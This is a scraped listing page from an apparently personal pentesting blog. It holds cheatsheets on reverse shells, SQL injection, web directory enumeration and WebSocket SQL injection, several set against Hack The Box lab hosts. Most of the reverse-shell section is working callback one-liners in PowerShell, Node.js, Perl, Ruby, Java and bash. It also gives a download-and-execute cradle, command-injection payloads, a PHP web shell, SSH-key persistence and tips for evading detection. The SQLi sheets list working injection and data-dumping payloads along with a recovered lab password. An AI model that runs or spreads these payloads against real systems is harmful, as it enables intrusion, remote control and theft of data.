-e /bin/bash PowerShell Reverse Shells (Windows) Basic PowerShell # Simple PowerShell reverse shell powershell -nop -c &#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;10.10.14.13&#39;,9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback &#43; &#39;PS &#39; &#43; (pwd).Path &#43; &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#34; # Base64 encoded PowerShell powershell -enc &lt;base64_encoded_command&gt; # Download and execute powershell &#34;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.13/shell.ps1&#39;)&#34; Advanced PowerShell # PowerShell with authentication bypass powershell -ExecutionPolicy Bypass -File shell.ps1 # PowerShell one-liner (formatted) $client = New-Object System.Net.Sockets.TCPClient(&#34;10.10.14.13&#34;,9001); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2&gt;&amp;1 | Out-String ); $sendback2 = $sendback &#43; &#34;PS &#34; &#43; (pwd).Path &#43; &#34;&gt; &#34;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close() Node.js Reverse Shells Basic Node.js # Simple Node.js reverse shell node -e &#34;require(&#39;child_process&#39;).exec(&#39;nc -e /bin/sh 10.10.14.13 9001&#39;)&#34; # Pure Node.js implementation (function(){ var net = require(&#34;net&#34;), cp = require(&#34;child_process&#34;), sh = cp.spawn(&#34;/bin/sh&#34;, []); var client = new net.Socket(); client.connect(9001, &#34;10.10.14.13&#34;, function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })(); Other Language Shells Perl # Perl reverse shell perl -e &#39;use Socket;$i=&#34;10.10.14.13&#34;;$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39; # Alternative Perl perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&#34;10.10.14.13:9001&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39; Ruby # Ruby reverse shell ruby -rsocket -e &#39;f=TCPSocket.open(&#34;10.10.14.13&#34;,9001).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39; # Alternative Ruby ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&#34;10.10.14.13&#34;,&#34;9001&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39; Java # Java reverse shell import java.io.*; import java.net.*; public class ReverseShell { public static void main(String[] args) throws Exception { Socket s = new Socket(&#34;10.10.14.13&#34;, 9001); Process p = Runtime.getRuntime().exec(&#34;/bin/bash&#34;); InputStream pi = p.getInputStream(); InputStream pe = p.getErrorStream(); InputStream si = s.getInputStream(); OutputStream po = p.getOutputStream(); OutputStream so = s.getOutputStream(); while(!s.isClosed()) { while(pi.available()&gt;0) so.write(pi.read()); while(pe.available()&gt;0) so.write(pe.read()); while(si.available()&gt;0) po.write(si.read()); so.flush(); po.flush(); Thread.sleep(50); try { p.exitValue(); break; } catch (Exception e) {} } p.destroy(); s.close(); } } Shell Stabilization TTY Upgrade # Python PTY python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; # Background the shell CTRL &#43; Z # Set raw mode and foreground stty raw -echo; fg # Set terminal environment export TERM=xterm # Check screen size and set stty -a stty rows 28 cols 110 Alternative TTY Methods # Using script script -qc /bin/bash /dev/null # Using socat (if available on target) socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.10.14.13:9001 # Using expect expect -c &#34;spawn /bin/bash; interact&#34; SSH-Based Access sshpass for Automated SSH Login # Install sshpass sudo apt install sshpass # SSH with password (from extracted credentials) sshpass -p &#39;PlayerOftheMatch2022&#39; ssh player@10.10.11.194 # SSH with password from file echo &#39;password123&#39; &gt; /tmp/pass sshpass -f /tmp/pass ssh user@target # SSH with password and command execution sshpass -p &#39;password&#39; ssh user@target &#39;whoami&#39; # Disable host key checking for testing sshpass -p &#39;password&#39; ssh -o StrictHostKeyChecking=no user@target SSH Key-Based Access # Use existing private key ssh -i /path/to/private_key user@target # SSH with specific key and no host checking ssh -i /path/to/key -o StrictHostKeyChecking=no user@target # Generate SSH key pair for persistence ssh-keygen -t rsa -f /tmp/key -N &#34;&#34; # Copy public key to target (if possible) cat /tmp/key.pub &gt;&gt; ~/.ssh/authorized_keys Shell Enhancement # Set environment variables export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin export SHELL=/bin/bash export HOME=/tmp # Enable command history export HISTFILE=/tmp/.bash_history # Color prompt export PS1=&#39;\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#39; Web Application Payloads Command Injection in Web Forms # Basic command injection ; bash -i &gt;&amp; /dev/tcp/10.10.14.13/9001 0&gt;&amp;1 # URL encoded %3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.13%2F9001%200%3E%261 # In JSON {&#34;cmd&#34;: &#34;; bash -i &gt;&amp; /dev/tcp/10.10.14.13/9001 0&gt;&amp;1&#34;} # As POST parameter cmd=bash -c &#39;bash -i /dev/tcp/10.10.14.13/9001 0&gt;&amp;1&#39; File Upload Shells # Simple PHP upload shell &lt;?php system($_GET[&#39;cmd&#39;]); ?&gt; # Save as shell.php and upload, then access: # http://target.com/uploads/shell.php?cmd=nc -e /bin/bash 10.10.14.13 9001 Troubleshooting Common Issues # No netcat with -e flag rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.13 9001 &gt;/tmp/f # Firewall blocking outbound connections # Try different ports: 80, 443, 53, 25 nc 10.10.14.13 443 -e /bin/bash # Limited shell environment export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin # No interactive shell python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; Testing Connectivity # Test if target can reach your IP ping 10.10.14.13 # Test specific port telnet 10.10.14.13 9001 nc -nv 10.10.14.13 9001 # DNS exfiltration test nslookup test.yourdomain.com Security Considerations Operational Security Use encrypted channels when possible (HTTPS, SSH tunnels) Avoid leaving artifacts on target systems Clean up uploaded files and temporary files Use staging servers to avoid direct connections Detection Evasion Use common ports (80, 443, 53) to blend with normal traffic Implement delays between connection attempts Use domain names instead of IP addresses when possible Rotate source IP addresses if available Always ensure you have proper authorization before deploying reverse shells on any target system. These techniques should only be used for legitimate security testing purposes.
</p>
  </div>
  <footer class="entry-footer"><span title='2024-01-01 00:00:00 +0000 UTC'>January 1, 2024</span>&nbsp;·&nbsp;<span>7 min</span>&nbsp;·&nbsp;<span>realspaceeagle</span></footer>
  <a class="entry-link" aria-label="post link to Reverse Shell Cheatsheet" href="https://realspaceeagle.github.io/cheatsheets/reverse-shells/"></a>
</article>

<article class="post-entry tag-entry"> 
  <header class="entry-header">
    <h2 class="entry-hint-parent">SQL Injection Cheatsheet
    </h2>
  </header>
  <div class="entry-content">
    <p>SQL Injection Cheatsheet Test Workflow Identify entry points: parameters, headers, cookies, JSON bodies. Baseline request: repeat the request and capture the normal response for comparison. Break the query: start with a single quote &#39; or double quote &#34; to look for syntax errors. Confirm injection: use logic tests such as AND 1=1 (true) vs AND 1=2 (false). Escalate: move from time-based to union-based or stacked queries depending on DBMS. Quick Payloads &#39; OR &#39;1&#39;=&#39;1&#39; -- &#34; OR &#34;1&#34;=&#34;1&#34; -- &#39;) OR &#39;1&#39;=&#39;1&#39; -- admin&#39; -- admin&#39; # Numeric Context 1 OR 1=1 1 UNION ALL SELECT NULL 1 ORDER BY 5-- Boolean Tests 1 AND 1=1 1 AND SLEEP(5) 1 AND (SELECT 1 FROM pg_sleep(5)) Union Enumeration Count columns: ORDER BY 1, ORDER BY 2, increment until error. Match types: UNION ALL SELECT NULL,NULL etc. Extract data: replace NULL with payloads like @@version, database(), or current_user. 1 UNION ALL SELECT @@version, user() 1 UNION ALL SELECT NULL, table_name FROM information_schema.tables Time-Based Enumeration 1 AND SLEEP(5) 1 AND (SELECT CASE WHEN (SUBSTRING(user(),1,1)=&#39;r&#39;) THEN SLEEP(5) ELSE 0 END) &#39;; WAITFOR DELAY &#39;0:0:5&#39;-- Stacked Queries &#39;; DROP TABLE users; -- &#39;; INSERT INTO log_table(user, ts) VALUES (&#39;tester&#39;, NOW()); -- Only available when the database driver supports multiple statements.
...</p>
  </div>
  <footer class="entry-footer"><span title='2024-01-01 00:00:00 +0000 UTC'>January 1, 2024</span>&nbsp;·&nbsp;<span>2 min</span>&nbsp;·&nbsp;<span>realspaceeagle</span></footer>
  <a class="entry-link" aria-label="post link to SQL Injection Cheatsheet" href="https://realspaceeagle.github.io/cheatsheets/sql-injection/"></a>
</article>

<article class="post-entry tag-entry"> 
  <header class="entry-header">
    <h2 class="entry-hint-parent">Web Directory Enumeration Cheatsheet
    </h2>
  </header>
  <div class="entry-content">
    <p>Web Directory Enumeration Cheatsheet Initial Setup and Preparation Environment Variables Setup # Set up common environment variables for pentesting export LPORT=10.10.14.13 # Your attacking machine IP export RPORT=10.10.11.194 # Target machine IP export LHOST=10.10.14.13 # Alternative naming export RHOST=10.10.11.194 # Alternative naming # Use in commands nc -nlvp $LPORT bash -i &gt;&amp; /dev/tcp/$LPORT/9001 0&gt;&amp;1 Host File Modification # Add target to hosts file for virtual host testing sudo nano /etc/hosts # Example entries 10.10.11.194 soccer.htb 10.10.11.194 soccer.htb soc-player.soccer.htb # Alternative using echo echo &#34;10.10.11.194 soccer.htb&#34; | sudo tee -a /etc/hosts echo &#34;10.10.11.194 soc-player.soccer.htb&#34; | sudo tee -a /etc/hosts # Verify hosts file entries cat /etc/hosts | grep htb Target Information Gathering # Ping test connectivity ping -c 4 $RHOST ping -c 4 soccer.htb # Quick port check nc -zv $RHOST 80 nc -zv $RHOST 443 # DNS resolution check nslookup soccer.htb dig soccer.htb Gobuster Basic Directory Enumeration # Basic directory enumeration gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt # With specific extensions gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php,html,txt # Output to file gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php -o root.gobuster # Common comprehensive scan gobuster dir -u http://soccer.htb -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php -o root.gobuster Advanced Gobuster Options # Include status codes gobuster dir -u http://target.com -w wordlist.txt -s &#34;200,204,301,302,307,403&#34; # Set custom User-Agent gobuster dir -u http://target.com -w wordlist.txt -a &#34;Mozilla/5.0 (Custom Agent)&#34; # Add cookies gobuster dir -u http://target.com -w wordlist.txt -c &#34;sessionid=abc123&#34; # Add headers gobuster dir -u http://target.com -w wordlist.txt -H &#34;Authorization: Bearer token123&#34; # Proxy through Burp gobuster dir -u http://target.com -w wordlist.txt -p http://127.0.0.1:8080 # Recursive enumeration gobuster dir -u http://target.com -w wordlist.txt -r # Follow redirects gobuster dir -u http://target.com -w wordlist.txt -f Gobuster Modes # Directory mode (default) gobuster dir -u http://target.com -w wordlist.txt # DNS subdomain enumeration gobuster dns -d target.com -w subdomains.txt # Virtual host enumeration gobuster vhost -u http://target.com -w vhosts.txt # S3 bucket enumeration gobuster s3 -w bucket-names.txt Feroxbuster Basic Usage # Basic directory scan feroxbuster -u http://target.com # With wordlist feroxbuster -u http://target.com -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt # Medium directory scan feroxbuster -u http://soccer.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt Advanced Feroxbuster Features # Multiple extensions feroxbuster -u http://target.com -x php,html,txt,js # Specific depth feroxbuster -u http://target.com --depth 4 # Rate limiting feroxbuster -u http://target.com --rate-limit 10 # Custom threads feroxbuster -u http://target.com -t 50 # Filter status codes feroxbuster -u http://target.com -C 404,403 # Filter response size feroxbuster -u http://target.com -S 1234 # Resume scan feroxbuster --resume-from state.toml Feroxbuster Output Options # JSON output feroxbuster -u http://target.com -o results.json # Silent mode feroxbuster -u http://target.com --silent # Extract links for further enumeration feroxbuster -u http://target.com --extract-links # Random delay between requests feroxbuster -u http://target.com --random-agent Dirsearch Basic Commands # Basic scan dirsearch -u http://target.com # With extensions dirsearch -u http://target.com -e php,html,js # Custom wordlist dirsearch -u http://target.com -w custom-wordlist.txt # Recursive scan dirsearch -u http://target.com -r # Save results dirsearch -u http://target.com --format=simple -o results.txt Ffuf Directory Fuzzing # Basic directory fuzzing ffuf -w wordlist.txt -u http://target.com/FUZZ # With extensions ffuf -w wordlist.txt -u http://target.com/FUZZ -e .php,.html,.txt # Filter by response code ffuf -w wordlist.txt -u http://target.com/FUZZ -mc 200,301,302 # Filter by response size ffuf -w wordlist.txt -u http://target.com/FUZZ -fs 1234 # Output to file ffuf -w wordlist.txt -u http://target.com/FUZZ -o results.json -of json Parameter Fuzzing # GET parameter fuzzing ffuf -w wordlist.txt -u &#34;http://target.com/search?FUZZ=test&#34; # POST data fuzzing ffuf -w wordlist.txt -u http://target.com/login -X POST -d &#34;username=admin&amp;password=FUZZ&#34; # Header fuzzing ffuf -w wordlist.txt -u http://target.com -H &#34;X-Forwarded-For: FUZZ&#34; Wordlists SecLists Common Paths # Small wordlists (fast) /opt/SecLists/Discovery/Web-Content/raft-small-words.txt /opt/SecLists/Discovery/Web-Content/common.txt # Medium wordlists (comprehensive) /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt # Large wordlists (extensive) /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt # Technology-specific /opt/SecLists/Discovery/Web-Content/spring-boot.txt /opt/SecLists/Discovery/Web-Content/apache.txt /opt/SecLists/Discovery/Web-Content/nginx.txt Custom Wordlist Creation # Extract words from target website cewl http://target.com -w custom-wordlist.txt # Combine wordlists cat wordlist1.txt wordlist2.txt | sort -u &gt; combined.txt # Generate variations # Add common extensions to base words sed &#39;s/$/.php/&#39; base-words.txt &gt; php-files.txt sed &#39;s/$/.html/&#39; base-words.txt &gt; html-files.txt Targeted Enumeration Content Management Systems # WordPress gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/CMS/wordpress.fuzz.txt # Drupal gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/CMS/drupal.fuzz.txt # Joomla gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/CMS/joomla.fuzz.txt File Extensions by Technology # PHP applications gobuster dir -u http://target.com -w wordlist.txt -x php,php3,php4,php5,phtml # ASP/ASP.NET applications gobuster dir -u http://target.com -w wordlist.txt -x asp,aspx,asmx,ashx # JSP applications gobuster dir -u http://target.com -w wordlist.txt -x jsp,jspa,jspx # Python applications gobuster dir -u http://target.com -w wordlist.txt -x py,pyc,pyo # Common web files gobuster dir -u http://target.com -w wordlist.txt -x html,htm,js,css,xml,json Backup and Sensitive Files # Common backup extensions gobuster dir -u http://target.com -w wordlist.txt -x bak,backup,old,orig,tmp # Configuration files gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/web-extensions.txt # Database files gobuster dir -u http://target.com -w wordlist.txt -x sql,db,sqlite,mdb Stealth and Evasion Rate Limiting and Timing # Slow scan to avoid detection gobuster dir -u http://target.com -w wordlist.txt --delay 100ms # Random User-Agent rotation feroxbuster -u http://target.com --random-agent # Custom User-Agent gobuster dir -u http://target.com -w wordlist.txt -a &#34;Mozilla/5.0 (Googlebot)&#34; # Proxy rotation gobuster dir -u http://target.com -w wordlist.txt -p http://proxy1:8080 Request Modification # Add realistic headers gobuster dir -u http://target.com -w wordlist.txt -H &#34;Accept: text/html,application/xhtml&#43;xml&#34; -H &#34;Accept-Language: en-US,en;q=0.9&#34; # Session-based enumeration gobuster dir -u http://target.com -w wordlist.txt -c &#34;PHPSESSID=abc123; auth_token=xyz789&#34; # Method tampering ffuf -w wordlist.txt -u http://target.com/FUZZ -X POST Analysis and Follow-up Response Analysis # Check for interesting status codes grep -E &#34;(200|301|302|403)&#34; gobuster-results.txt # Look for unusual response sizes awk &#39;{print $3, $1}&#39; gobuster-results.txt | sort -n # Extract found directories for further enumeration grep &#34;Status: 200&#34; gobuster-results.txt | awk &#39;{print $1}&#39; &gt; found-dirs.txt Automated Follow-up # Recursive enumeration of found directories while read dir; do gobuster dir -u http://target.com$dir -w wordlist.txt -x php,html done &lt; found-dirs.txt # Screenshot found pages while read url; do cutycapt --url=$url --out=screenshots/$(basename $url).png done &lt; found-urls.txt Common Findings and Next Steps Interesting Directories to Investigate /admin/ - Administrative interfaces /backup/ - Backup files and archives /config/ - Configuration files /uploads/ - File upload functionality /api/ - API endpoints /docs/ - Documentation /test/ - Test files and environments /dev/ - Development resources File Types to Prioritize .php, .asp, .jsp - Server-side scripts .config, .ini, .yaml - Configuration files .sql, .db - Database files .log - Log files with potential sensitive data .bak, .old - Backup files .git/, .svn/ - Version control directories Tips and Best Practices Performance Optimization Start with small wordlists for quick wins Use appropriate thread counts (10-50 for most servers) Implement delays for rate-limited or slow servers Use recursive scanning judiciously to avoid infinite loops Detection Avoidance Rotate User-Agents and request headers Implement random delays between requests Use proxy chains for sensitive targets Monitor for rate limiting or blocking responses Coverage Maximization Use multiple tools with different algorithms Combine wordlists for comprehensive coverage Include technology-specific extensions Follow up manual testing on interesting findings Always ensure you have proper authorization before conducting directory enumeration on any target system.
</p>
  </div>
  <footer class="entry-footer"><span title='2024-01-01 00:00:00 +0000 UTC'>January 1, 2024</span>&nbsp;·&nbsp;<span>6 min</span>&nbsp;·&nbsp;<span>realspaceeagle</span></footer>
  <a class="entry-link" aria-label="post link to Web Directory Enumeration Cheatsheet" href="https://realspaceeagle.github.io/cheatsheets/web-directory-enumeration/"></a>
</article>

<article class="post-entry tag-entry"> 
  <header class="entry-header">
    <h2 class="entry-hint-parent">WebSocket SQL Injection Cheatsheet
    </h2>
  </header>
  <div class="entry-content">
    <p>WebSocket SQL Injection Cheatsheet WebSocket Basics WebSocket Connection // Basic WebSocket connection var ws = new WebSocket(&#34;ws://target.com:9091&#34;); // With specific endpoint var ws = new WebSocket(&#34;ws://soc-player.soccer.htb:9091&#34;); // Secure WebSocket var wss = new WebSocket(&#34;wss://target.com:443/ws&#34;); WebSocket Message Format // JSON message format ws.send(JSON.stringify({ &#34;id&#34;: &#34;value_to_test&#34; })) // Simple string message ws.send(&#34;test_value&#34;) // Complex JSON structure ws.send(JSON.stringify({ &#34;action&#34;: &#34;query&#34;, &#34;data&#34;: { &#34;id&#34;: &#34;vulnerable_parameter&#34; } })) Testing WebSocket Connections Manual Browser Testing // Open browser console and connect var ws = new WebSocket(&#34;ws://soc-player.soccer.htb:9091&#34;); ws.onopen = function(e) { console.log(&#39;Connected to WebSocket&#39;); } ws.onmessage = function(e) { console.log(&#39;Received:&#39;, e.data); } // Send test payloads ws.send(JSON.stringify({&#34;id&#34;: &#34;1&#34;})) ws.send(JSON.stringify({&#34;id&#34;: &#34;1&#39;&#34;})) ws.send(JSON.stringify({&#34;id&#34;: &#34;1&#39; OR &#39;1&#39;=&#39;1&#34;})) Using wscat # Install wscat npm install -g wscat # Connect to WebSocket wscat -c ws://soc-player.soccer.htb:9091 # Send JSON payloads &gt; {&#34;id&#34;:&#34;1&#34;} &gt; {&#34;id&#34;:&#34;1&#39;&#34;} &gt; {&#34;id&#34;:&#34;1 OR 1=1&#34;} &gt; {&#34;id&#34;:&#34;92130 or 5=1-- -&#34;} SQL Injection Detection Basic Detection Payloads // Test for errors with single quote {&#34;id&#34;: &#34;&#39;&#34;} // Test for boolean conditions {&#34;id&#34;: &#34;1 AND 1=1&#34;} {&#34;id&#34;: &#34;1 AND 1=2&#34;} // Test for time delays {&#34;id&#34;: &#34;1 AND SLEEP(5)&#34;} {&#34;id&#34;: &#34;1&#39;; WAITFOR DELAY &#39;0:0:5&#39;--&#34;} // Test for union-based injection {&#34;id&#34;: &#34;1 UNION SELECT 1,2,3&#34;} Error-Based Detection // MySQL error triggers {&#34;id&#34;: &#34;1&#39;&#34;} {&#34;id&#34;: &#34;1\&#34;&#34;} {&#34;id&#34;: &#34;1`&#34;} // SQL Server error triggers {&#34;id&#34;: &#34;1&#39;&#34;} {&#34;id&#34;: &#34;1]&#34;} // PostgreSQL error triggers {&#34;id&#34;: &#34;1&#39;&#34;} {&#34;id&#34;: &#34;1$&#34;} Boolean-Based Detection // True condition {&#34;id&#34;: &#34;92130 or 5=5-- -&#34;} // False condition {&#34;id&#34;: &#34;92130 or 5=6-- -&#34;} // String comparison {&#34;id&#34;: &#34;1&#39; OR &#39;a&#39;=&#39;a&#39;-- -&#34;} {&#34;id&#34;: &#34;1&#39; OR &#39;a&#39;=&#39;b&#39;-- -&#34;} sqlmap with WebSockets Basic sqlmap Usage # Test WebSocket with JSON payload sqlmap -u &#39;ws://soc-player.soccer.htb:9091/&#39; --data &#39;{&#34;id&#34;:&#34;*&#34;}&#39; --batch # With specific risk and level sqlmap -u &#39;ws://soc-player.soccer.htb:9091/&#39; --data &#39;{&#34;id&#34;:&#34;*&#34;}&#39; --level 5 --risk 3 --batch # Enable threading for faster execution sqlmap -u &#39;ws://soc-player.soccer.htb:9091/&#39; --data &#39;{&#34;id&#34;:&#34;*&#34;}&#39; --level 5 --risk 3 --batch --threads 10 Database Enumeration # Enumerate databases sqlmap -u &#39;ws://soc-player.soccer.htb:9091/&#39; --data &#39;{&#34;id&#34;:&#34;*&#34;}&#39; --dbs --batch # Enumerate tables in specific database sqlmap -u &#39;ws://soc-player.soccer.htb:9091/&#39; --data &#39;{&#34;id&#34;:&#34;*&#34;}&#39; -D soccer_db --tables --batch # Dump specific table sqlmap -u &#39;ws://soc-player.soccer.htb:9091/&#39; --data &#39;{&#34;id&#34;:&#34;*&#34;}&#39; -D soccer_db -T accounts --dump --batch # Dump all data from database sqlmap -u &#39;ws://soc-player.soccer.htb:9091/&#39; --data &#39;{&#34;id&#34;:&#34;*&#34;}&#39; -D soccer_db --dump --batch Advanced sqlmap Options # Force specific DBMS sqlmap -u &#39;ws://target:9091/&#39; --data &#39;{&#34;id&#34;:&#34;*&#34;}&#39; --dbms=mysql --batch # Custom tamper scripts sqlmap -u &#39;ws://target:9091/&#39; --data &#39;{&#34;id&#34;:&#34;*&#34;}&#39; --tamper=space2comment --batch # Specify injection technique sqlmap -u &#39;ws://target:9091/&#39; --data &#39;{&#34;id&#34;:&#34;*&#34;}&#39; --technique=BT --batch # Save session sqlmap -u &#39;ws://target:9091/&#39; --data &#39;{&#34;id&#34;:&#34;*&#34;}&#39; --batch --session-file=session.db Manual Exploitation Techniques Boolean-Based Blind Injection // Check for MySQL {&#34;id&#34;: &#34;1&#39; AND (SELECT COUNT(*) FROM information_schema.tables) &gt; 0-- -&#34;} // Extract database name length {&#34;id&#34;: &#34;1&#39; AND LENGTH(database()) = 9-- -&#34;} // Extract database name character by character {&#34;id&#34;: &#34;1&#39; AND SUBSTRING(database(),1,1) = &#39;s&#39;-- -&#34;} {&#34;id&#34;: &#34;1&#39; AND SUBSTRING(database(),2,1) = &#39;o&#39;-- -&#34;} // Extract table names {&#34;id&#34;: &#34;1&#39; AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) = 1-- -&#34;} {&#34;id&#34;: &#34;1&#39; AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) = &#39;accounts&#39;-- -&#34;} Time-Based Blind Injection // MySQL time delays {&#34;id&#34;: &#34;1&#39; AND SLEEP(5)-- -&#34;} {&#34;id&#34;: &#34;1&#39; AND IF(LENGTH(database())=9,SLEEP(5),0)-- -&#34;} // SQL Server time delays {&#34;id&#34;: &#34;1&#39;; WAITFOR DELAY &#39;0:0:5&#39;-- -&#34;} {&#34;id&#34;: &#34;1&#39;; IF (LEN(DB_NAME())=9) WAITFOR DELAY &#39;0:0:5&#39;-- -&#34;} // PostgreSQL time delays {&#34;id&#34;: &#34;1&#39; AND (SELECT 1 FROM pg_sleep(5))-- -&#34;} // Conditional time delays {&#34;id&#34;: &#34;1&#39; AND (CASE WHEN (SUBSTRING(user(),1,1)=&#39;r&#39;) THEN SLEEP(5) ELSE 0 END)-- -&#34;} Union-Based Injection // Determine number of columns {&#34;id&#34;: &#34;1&#39; ORDER BY 1-- -&#34;} {&#34;id&#34;: &#34;1&#39; ORDER BY 2-- -&#34;} {&#34;id&#34;: &#34;1&#39; ORDER BY 3-- -&#34;} // Test for UNION compatibility {&#34;id&#34;: &#34;1&#39; UNION SELECT NULL-- -&#34;} {&#34;id&#34;: &#34;1&#39; UNION SELECT NULL,NULL-- -&#34;} // Extract database information {&#34;id&#34;: &#34;1&#39; UNION SELECT @@version,user()-- -&#34;} {&#34;id&#34;: &#34;1&#39; UNION SELECT database(),NULL-- -&#34;} // Extract table data {&#34;id&#34;: &#34;1&#39; UNION SELECT table_name,NULL FROM information_schema.tables-- -&#34;} {&#34;id&#34;: &#34;1&#39; UNION SELECT username,password FROM accounts-- -&#34;} WebSocket-Specific Payloads JSON Context Injection // Basic JSON structure {&#34;id&#34;: &#34;1&#39; OR &#39;1&#39;=&#39;1&#34;} // Nested JSON injection { &#34;user_data&#34;: { &#34;id&#34;: &#34;1&#39; UNION SELECT password FROM users-- -&#34; } } // Array-based injection { &#34;ids&#34;: [&#34;1&#34;, &#34;2&#39; OR &#39;1&#39;=&#39;1-- -&#34;, &#34;3&#34;] } Message Format Variations // Different parameter names {&#34;user_id&#34;: &#34;1&#39; OR 1=1-- -&#34;} {&#34;session_id&#34;: &#34;1&#39; OR 1=1-- -&#34;} {&#34;query&#34;: &#34;1&#39; OR 1=1-- -&#34;} // Multiple parameters { &#34;id&#34;: &#34;1&#34;, &#34;type&#34;: &#34;user&#39; OR 1=1-- -&#34; } // Base64 encoded payloads {&#34;id&#34;: &#34;MSBPUiAxPTEtLSAt&#34;} // 1 OR 1=1-- - Real-World Example: Soccer HTB Connection Setup // Target WebSocket from Soccer HTB var ws = new WebSocket(&#34;ws://soc-player.soccer.htb:9091&#34;); ws.onopen = function(e) { console.log(&#39;Connected to soccer WebSocket&#39;); } ws.onmessage = function(e) { console.log(&#39;Response:&#39;, e.data); } Testing Process // 1. Test basic functionality ws.send(JSON.stringify({&#34;id&#34;: &#34;1&#34;})) // 2. Test for SQL injection ws.send(JSON.stringify({&#34;id&#34;: &#34;1&#39;&#34;})) // 3. Boolean-based testing ws.send(JSON.stringify({&#34;id&#34;: &#34;92130 or 5=1-- -&#34;})) // 4. Confirm vulnerability ws.send(JSON.stringify({&#34;id&#34;: &#34;1 OR 1=1-- -&#34;})) sqlmap Exploitation # Soccer HTB WebSocket SQLi sqlmap -u &#39;ws://soc-player.soccer.htb:9091/&#39; --data &#39;{&#34;id&#34;:&#34;*&#34;}&#39; --level 5 --risk 3 --batch --threads 10 -D soccer_db --dump # Results found: # Database: soccer_db # Table: accounts # [1 entry] # &#43;------&#43;-------------------&#43;----------------------&#43;----------&#43; # | id | email | password | username | # &#43;------&#43;-------------------&#43;----------------------&#43;----------&#43; # | 1324 | player@player.htb | PlayerOftheMatch2022 | player | # &#43;------&#43;-------------------&#43;----------------------&#43;----------&#43; Detection and Response Analysis Response Analysis # Look for different response patterns # - Response time differences (time-based) # - Content length variations (boolean-based) # - Error messages (error-based) # - Data extraction (union-based) # Response timing measurement time echo &#39;{&#34;id&#34;:&#34;1 AND SLEEP(5)&#34;}&#39; | wscat -c ws://target:9091 Database Fingerprinting // MySQL detection {&#34;id&#34;: &#34;1&#39; AND @@version LIKE &#39;%mysql%&#39;-- -&#34;} // SQL Server detection {&#34;id&#34;: &#34;1&#39; AND @@version LIKE &#39;%Microsoft%&#39;-- -&#34;} // PostgreSQL detection {&#34;id&#34;: &#34;1&#39; AND version() LIKE &#39;%PostgreSQL%&#39;-- -&#34;} // SQLite detection {&#34;id&#34;: &#34;1&#39; AND sqlite_version() IS NOT NULL-- -&#34;} Automation Scripts Python WebSocket SQLi Script import websocket import json import time def test_websocket_sqli(url, payloads): def on_message(ws, message): print(f&#34;Response: {message}&#34;) def on_error(ws, error): print(f&#34;Error: {error}&#34;) def on_close(ws, close_status_code, close_msg): print(&#34;Connection closed&#34;) def on_open(ws): print(&#34;Connected to WebSocket&#34;) for payload in payloads: data = json.dumps({&#34;id&#34;: payload}) print(f&#34;Sending: {data}&#34;) ws.send(data) time.sleep(1) ws.close() ws = websocket.WebSocketApp(url, on_open=on_open, on_message=on_message, on_error=on_error, on_close=on_close) ws.run_forever() # Usage payloads = [ &#34;1&#34;, &#34;1&#39;&#34;, &#34;1&#39; OR &#39;1&#39;=&#39;1&#34;, 